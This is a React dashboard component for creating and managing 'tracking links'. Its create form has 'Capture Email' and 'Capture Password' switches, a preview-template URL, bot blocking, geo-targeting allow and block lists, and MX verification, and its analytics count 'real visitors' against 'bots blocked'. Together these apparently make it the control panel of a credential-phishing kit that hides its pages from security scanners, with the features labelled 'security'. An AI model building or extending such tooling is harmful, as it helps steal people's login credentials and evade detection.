import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from './ui/card';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Badge } from './ui/badge';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
import { Tabs, TabsContent, TabsList, TabsTrigger } from './ui/tabs';
import { Switch } from './ui/switch';
import { Label } from './ui/label';
import { Textarea } from './ui/textarea';
import { 
  Link, 
  Copy, 
  Eye, 
  EyeOff, 
  Plus, 
  Search, 
  Filter, 
  MoreVertical, 
  MousePointer, 
  Users, 
  Shield, 
  Globe,
  Calendar,
  Target,
  Settings,
  Trash2,
  Edit,
  BarChart3,
  TrendingUp
} from 'lucide-react';
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from './ui/dropdown-menu';

const TrackingLinks = () => {
  const [links, setLinks] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [filter, setFilter] = useState('All');
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [hiddenUrls, setHiddenUrls] = useState({});
  const [loading, setLoading] = useState(true);
  const [analytics, setAnalytics] = useState({
    totalClicks: 0,
    realVisitors: 0,
    botsBlocked: 0,
    totalLinks: 0
  });
  
  const [newLink, setNewLink] = useState({
    target_url: '',
    preview_template_url: '',
    campaign_name: '',
    capture_email: false,
    capture_password: false,
    bot_blocking_enabled: true,
    geo_targeting_enabled: false,
    geo_targeting_type: 'allow', // 'allow' or 'block'
    allowed_countries: [],
    blocked_countries: [],
    allowed_regions: [],
    blocked_regions: [],
    allowed_cities: [],
    blocked_cities: [],
    rate_limiting_enabled: false,
    dynamic_signature_enabled: false,
    mx_verification_enabled: false
  });

  useEffect(() => {
    fetchLinks();
  }, []);

  const fetchLinks = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/links', {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setLinks(data.links || []);
        
        // Calculate analytics from links data
        const totalClicks = (data.links || []).reduce((sum, link) => sum + (link.total_clicks || 0), 0);
        const realVisitors = (data.links || []).reduce((sum, link) => sum + (link.real_visitors || 0), 0);
        const botsBlocked = (data.links || []).reduce((sum, link) => sum + (link.blocked_attempts || 0), 0);
        const totalLinks = (data.links || []).length;
        
        setAnalytics({ totalClicks, realVisitors, botsBlocked, totalLinks });
      } else {
        console.error('Failed to fetch links:', response.statusText);
      }
    } catch (error) {
      console.error('Error fetching links:', error);
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = async (text, type) => {
    try {
      await navigator.clipboard.writeText(text);
      // Show success notification
      const notification = document.createElement('div');
      notification.className = 'fixed top-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg z-50 text-sm font-medium';
      notification.textContent = `${type} copied to clipboard!`;
      document.body.appendChild(notification);
      setTimeout(() => {
        document.body.removeChild(notification);
      }, 3000);
    } catch (err) {
      console.error('Failed to copy: ', err);
    }
  };

  const toggleUrlVisibility = (linkId) => {
    setHiddenUrls(prev => ({
      ...prev,
      [linkId]: !prev[linkId]
    }));
  };

  const createLink = async () => {
    try {
      const response = await fetch('/api/links', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify(newLink)
      });

      if (response.ok) {
        const result = await response.json();
        setLinks(prev => [result.link, ...prev]);
        setShowCreateModal(false);
        setNewLink({
          target_url: '',
          preview_template_url: '',
          campaign_name: '',
          capture_email: false,
          capture_password: false,
          bot_blocking_enabled: true,
          rate_limiting_enabled: false,
          dynamic_signature_enabled: false,
          mx_verification_enabled: false,
          geo_targeting_enabled: false,
          geo_targeting_type: 'allow',
          allowed_countries: [],
          blocked_countries: [],
          allowed_cities: [],
          blocked_cities: [],
          allowed_regions: [],
          blocked_regions: []
        });
        fetchLinks(); // Refresh the list
      } else {
        const errorData = await response.json();
        alert(`Failed to create link: ${errorData.error || 'Unknown error'}`);
      }
    } catch (error) {
      console.error('Error creating link:', error);
      alert('Error creating link. Please try again.');
    }
  };

  const deleteLink = async (linkId) => {
    if (!confirm('Are you sure you want to delete this link? This action cannot be undone.')) {
      return;
    }

    try {
      const response = await fetch('/api/links', {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify({ id: linkId })
      });

      if (response.ok) {
        setLinks(prev => prev.filter(link => link.id !== linkId));
        fetchLinks(); // Refresh analytics
      } else {
        const errorData = await response.json();
        alert(`Failed to delete link: ${errorData.error || 'Unknown error'}`);
      }
    } catch (error) {
      console.error('Error deleting link:', error);
      alert('Error deleting link. Please try again.');
    }
  };

  const regenerateLink = async (linkId) => {
    try {
      const response = await fetch(`/api/links/${linkId}/regenerate`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      });

      if (response.ok) {
        fetchLinks(); // Refresh the list
        alert('Link regenerated successfully!');
      } else {
        const errorData = await response.json();
        alert(`Failed to regenerate link: ${errorData.error || 'Unknown error'}`);
      }
    } catch (error) {
      console.error('Error regenerating link:', error);
      alert('Error regenerating link. Please try again.');
    }
  };

  const filteredLinks = links.filter(link => {
    const matchesSearch = link.campaign_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         link.target_url?.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         link.short_code?.toLowerCase().includes(searchTerm.toLowerCase());
    
    if (filter === 'All') return matchesSearch;
    if (filter === 'Active') return matchesSearch && link.status === 'active';
    if (filter === 'Expired') return matchesSearch && link.status === 'expired';
    return matchesSearch;
  });

  const formatDate = (dateString) => {
    if (!dateString) return 'Never';
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric'
    });
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Tracking Links</h1>
          <p className="text-sm text-muted-foreground">
            Create and manage advanced tracking links with security features
          </p>
        </div>
        <Button onClick={() => setShowCreateModal(true)}>
          <Plus className="h-4 w-4 mr-2" />
          Create Link
        </Button>
      </div>

      {/* Analytics Cards - 4 cards in one horizontal row */}
      <div className="grid grid-cols-4 gap-4">
        <Card className="border-l-4 border-l-blue-500">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-muted-foreground">Total Links</p>
                <p className="text-2xl font-bold">{analytics.totalLinks}</p>
              </div>
              <Link className="h-5 w-5 text-blue-500" />
            </div>
          </CardContent>
        </Card>

        <Card className="border-l-4 border-l-green-500">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-muted-foreground">Total Clicks</p>
                <p className="text-2xl font-bold">{analytics.totalClicks}</p>
              </div>
              <MousePointer className="h-5 w-5 text-green-500" />
            </div>
          </CardContent>
        </Card>

        <Card className="border-l-4 border-l-purple-500">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-muted-foreground">Real Visitors</p>
                <p className="text-2xl font-bold">{analytics.realVisitors}</p>
              </div>
              <Users className="h-5 w-5 text-purple-500" />
            </div>
          </CardContent>
        </Card>

        <Card className="border-l-4 border-l-red-500">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-muted-foreground">Bots Blocked</p>
                <p className="text-2xl font-bold">{analytics.botsBlocked}</p>
              </div>
              <Shield className="h-5 w-5 text-red-500" />
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Filters and Search */}
      <div className="flex flex-col sm:flex-row gap-4">
        <div className="relative flex-1">
          <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="Search links..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pl-8"
          />
        </div>
        <Select value={filter} onValueChange={setFilter}>
          <SelectTrigger className="w-32">
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="All">All Links</SelectItem>
            <SelectItem value="Active">Active</SelectItem>
            <SelectItem value="Expired">Expired</SelectItem>
          </SelectContent>
        </Select>
      </div>

      {/* Links Table */}
      <Card>
        <CardHeader>
          <CardTitle>Tracking Links</CardTitle>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="flex items-center justify-center py-8">
              <div className="text-sm text-muted-foreground">Loading links...</div>
            </div>
          ) : filteredLinks.length === 0 ? (
            <div className="flex items-center justify-center py-8">
              <div className="text-sm text-muted-foreground">No links found</div>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Campaign</TableHead>
                    <TableHead>Target URL</TableHead>
                    <TableHead>Tracking URL</TableHead>
                    <TableHead>Clicks</TableHead>
                    <TableHead>Visitors</TableHead>
                    <TableHead>Created</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead>Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredLinks.map((link) => (
                    <TableRow key={link.id}>
                      <TableCell className="font-medium">
                        <div className="flex items-center gap-2">
                          <Target className="h-4 w-4 text-blue-500" />
                          {link.campaign_name || 'Untitled Campaign'}
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          {hiddenUrls[link.id] ? (
                            <span className="text-sm text-muted-foreground">••••••••••••</span>
                          ) : (
                            <span className="text-sm truncate max-w-xs">{link.target_url}</span>
                          )}
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => toggleUrlVisibility(link.id)}
                          >
                            {hiddenUrls[link.id] ? <Eye className="h-3 w-3" /> : <EyeOff className="h-3 w-3" />}
                          </Button>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <span className="text-sm font-mono">{link.tracking_url}</span>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => copyToClipboard(link.tracking_url, 'Tracking URL')}
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge variant="outline" className="flex items-center gap-1">
                          <MousePointer className="h-3 w-3" />
                          {link.total_clicks || 0}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <Badge variant="outline" className="flex items-center gap-1">
                          <Users className="h-3 w-3" />
                          {link.real_visitors || 0}
                        </Badge>
                      </TableCell>
                      <TableCell className="text-sm text-muted-foreground">
                        {formatDate(link.created_at)}
                      </TableCell>
                      <TableCell>
                        <Badge variant={link.status === 'active' ? 'default' : 'secondary'}>
                          {link.status || 'active'}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <DropdownMenu>
                          <DropdownMenuTrigger asChild>
                            <Button variant="ghost" size="sm">
                              <MoreVertical className="h-4 w-4" />
                            </Button>
                          </DropdownMenuTrigger>
                          <DropdownMenuContent>
                            <DropdownMenuItem onClick={() => regenerateLink(link.id)}>
                              <Edit className="h-4 w-4 mr-2" />
                              Regenerate
                            </DropdownMenuItem>
                            <DropdownMenuItem onClick={() => deleteLink(link.id)} className="text-red-600">
                              <Trash2 className="h-4 w-4 mr-2" />
                              Delete
                            </DropdownMenuItem>
                          </DropdownMenuContent>
                        </DropdownMenu>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Create Link Modal */}
      {showCreateModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Plus className="h-5 w-5" />
                  Create New Tracking Link
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="target_url">Target URL *</Label>
                  <Input
                    id="target_url"
                    type="url"
                    value={newLink.target_url}
                    onChange={(e) => setNewLink(prev => ({ ...prev, target_url: e.target.value }))}
                    placeholder="https://example.com"
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="campaign_name">Campaign Name</Label>
                  <Input
                    id="campaign_name"
                    value={newLink.campaign_name}
                    onChange={(e) => setNewLink(prev => ({ ...prev, campaign_name: e.target.value }))}
                    placeholder="My Campaign"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="preview_url">Preview Template URL</Label>
                  <Input
                    id="preview_url"
                    type="url"
                    value={newLink.preview_template_url}
                    onChange={(e) => setNewLink(prev => ({ ...prev, preview_template_url: e.target.value }))}
                    placeholder="https://preview.example.com"
                  />
                </div>

                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">Security Features</h3>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="flex items-center space-x-2">
                      <Switch
                        id="capture_email"
                        checked={newLink.capture_email}
                        onCheckedChange={(checked) => setNewLink(prev => ({ ...prev, capture_email: checked }))}
                      />
                      <Label htmlFor="capture_email">Capture Email</Label>
                    </div>

                    <div className="flex items-center space-x-2">
                      <Switch
                        id="capture_password"
                        checked={newLink.capture_password}
                        onCheckedChange={(checked) => setNewLink(prev => ({ ...prev, capture_password: checked }))}
                      />
                      <Label htmlFor="capture_password">Capture Password</Label>
                    </div>

                    <div className="flex items-center space-x-2">
                      <Switch
                        id="bot_blocking"
                        checked={newLink.bot_blocking_enabled}
                        onCheckedChange={(checked) => setNewLink(prev => ({ ...prev, bot_blocking_enabled: checked }))}
                      />
                      <Label htmlFor="bot_blocking">Bot Blocking</Label>
                    </div>

                    <div className="flex items-center space-x-2">
                      <Switch
                        id="rate_limiting"
                        checked={newLink.rate_limiting_enabled}
                        onCheckedChange={(checked) => setNewLink(prev => ({ ...prev, rate_limiting_enabled: checked }))}
                      />
                      <Label htmlFor="rate_limiting">Rate Limiting</Label>
                    </div>

                    <div className="flex items-center space-x-2">
                      <Switch
                        id="geo_targeting"
                        checked={newLink.geo_targeting_enabled}
                        onCheckedChange={(checked) => setNewLink(prev => ({ ...prev, geo_targeting_enabled: checked }))}
                      />
                      <Label htmlFor="geo_targeting">Geo Targeting</Label>
                    </div>
                  </div>

                  {/* Enhanced Geolocation Fields - Only show when geo targeting is enabled */}
                  {newLink.geo_targeting_enabled && (
                    <div className="space-y-4 mt-4 p-4 border rounded-lg bg-gray-50">
                      <div className="space-y-2">
                        <Label htmlFor="geo_targeting_type">Targeting Type</Label>
                        <Select
                          value={newLink.geo_targeting_type}
                          onValueChange={(value) => setNewLink(prev => ({ ...prev, geo_targeting_type: value }))}
                        >
                          <SelectTrigger>
                            <SelectValue placeholder="Select targeting type" />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="allow">Allow Selected Locations</SelectItem>
                            <SelectItem value="block">Block Selected Locations</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <Label htmlFor="countries">Countries</Label>
                          <Textarea
                            id="countries"
                            placeholder="Enter countries (one per line)&#10;e.g. United States&#10;Canada&#10;United Kingdom"
                            value={newLink.geo_targeting_type === 'allow' ? newLink.allowed_countries.join('\n') : newLink.blocked_countries.join('\n')}
                            onChange={(e) => {
                              const countries = e.target.value.split('\n').filter(c => c.trim());
                              if (newLink.geo_targeting_type === 'allow') {
                                setNewLink(prev => ({ ...prev, allowed_countries: countries }));
                              } else {
                                setNewLink(prev => ({ ...prev, blocked_countries: countries }));
                              }
                            }}
                            rows={4}
                          />
                        </div>

                        <div className="space-y-2">
                          <Label htmlFor="regions">Cities/Regions</Label>
                          <Textarea
                            id="regions"
                            placeholder="Enter cities or regions (one per line)&#10;e.g. New York&#10;California&#10;London"
                            value={newLink.geo_targeting_type === 'allow' ? 
                              [...newLink.allowed_regions, ...newLink.allowed_cities].join('\n') : 
                              [...newLink.blocked_regions, ...newLink.blocked_cities].join('\n')
                            }
                            onChange={(e) => {
                              const locations = e.target.value.split('\n').filter(l => l.trim());
                              if (newLink.geo_targeting_type === 'allow') {
                                setNewLink(prev => ({ 
                                  ...prev, 
                                  allowed_regions: locations,
                                  allowed_cities: locations 
                                }));
                              } else {
                                setNewLink(prev => ({ 
                                  ...prev, 
                                  blocked_regions: locations,
                                  blocked_cities: locations 
                                }));
                              }
                            }}
                            rows={4}
                          />
                        </div>
                      </div>
                    </div>
                  )}
                </div>

                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">Additional Options</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">

                    <div className="flex items-center space-x-2">
                      <Switch
                        id="mx_verification"
                        checked={newLink.mx_verification_enabled}
                        onCheckedChange={(checked) => setNewLink(prev => ({ ...prev, mx_verification_enabled: checked }))}
                      />
                      <Label htmlFor="mx_verification">MX Verification</Label>
                    </div>
                  </div>
                </div>

                <div className="flex gap-3 pt-4">
                  <Button onClick={createLink} className="flex-1">
                    Create Link
                  </Button>
                  <Button variant="outline" onClick={() => setShowCreateModal(false)} className="flex-1">
                    Cancel
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      )}
    </div>
  );
};

export default TrackingLinks;

